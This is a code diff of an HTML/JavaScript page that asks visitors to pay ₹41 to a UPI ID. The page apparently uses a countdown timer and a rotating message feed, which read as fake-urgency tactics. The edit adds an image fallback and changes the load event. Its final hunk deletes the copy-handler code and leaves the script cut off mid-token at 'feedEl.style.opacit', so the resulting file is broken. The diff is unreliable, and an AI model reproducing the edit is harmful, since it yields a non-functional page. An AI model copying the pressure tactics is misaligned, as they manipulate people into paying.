@@ -551,7 +551,7 @@ footer{ text-align: center; font-size: 10px; color: var(--text-muted); font-weig
     <div class="scan-box-wrapper">
       <div class="amount-banner-scanner">PAY ₹41 ONLY</div>
       <div class="qr-container">
-        <img src="IMG_20260911_222905.png" alt="QR Code">
+        <img src="IMG_20260911_222905.png" alt="QR Code" onerror="this.src='https://via.placeholder.com/170?text=QR+Code+Missing'">
       </div>
       <div class="upi-copy-box">
         <code id="upiId">sunny999bot@nyes</code>
@@ -624,10 +624,10 @@ footer{ text-align: center; font-size: 10px; color: var(--text-muted); font-weig
 </nav>
 
 <script>
-// Safe execution window load
-window.addEventListener("load", function() {
+// Use DOMContentLoaded to make sure it executes instantly without waiting for missing images
+document.addEventListener("DOMContentLoaded", function() {
   
-  /* 1. TIMER LOGIC (SAFE & INDEPENDENT) */
+  /* 1. TIMER LOGIC */
   let totalSeconds = 14 * 3600 + 58 * 60 + 52;
   const countdownEl = document.getElementById("countdown");
 
@@ -670,10 +670,4 @@ window.addEventListener("load", function() {
       feedEl.style.opacity = 0;
       setTimeout(() => {
         feedEl.innerText = feedMessages[feedIndex];
-        feedEl.style.opacity = 1;
-      }, 300);
-    }
-  }, 4000);
-
-  /* 3. SAFE COPY & PASTE HANDLERS (NO CRASHES) */
-  const copyBtn = document.getElementBy
+        feedEl.style.opacit
